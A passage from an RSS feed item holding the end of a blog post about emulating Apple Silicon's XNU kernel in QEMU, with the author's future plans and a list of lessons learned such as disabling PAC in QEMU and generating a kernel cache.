      <li>port Apple’s old <a href="https://opensource.apple.com/source/AppleMacRiscPCI/AppleMacRiscPCI-3.4/AppleMacRiscPCI.cpp.auto.html">PowerPC PCIE</a> drivers, since it’s too hard to emulate the Apple Silicon PCIE controller. This will allow us to connect a virtual hard drive.</li>
    </ul>
  </li>
  <li>Switch to the A14 kernel when Apple releases Apple Silicon Macs, so we can test virtualization</li>
</ul>

<h2 id="what-i-learned">What I learned</h2>

<ul>
  <li>How to modify QEMU to disable PAC</li>
  <li>How iBoot on Apple Silicon passes boot options in the device tree</li>
  <li>How to generate an Apple Silicon kernel cache without an Apple Silicon Mac</li>
  <li>How to fight <code>kmutil</code> for the real error message</li>
  <li>Never procrastinate on a blog post for three months</li>
</ul>

  </div>
</article>

      </div>
      
    </div></div>]]>
            </description>
            <link>https://worthdoingbadly.com/xnuqemu3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064593</guid>
            <pubDate>Thu, 12 Nov 2020 00:09:01 GMT</pubDate>
        </item>
    </channel>
</rss>
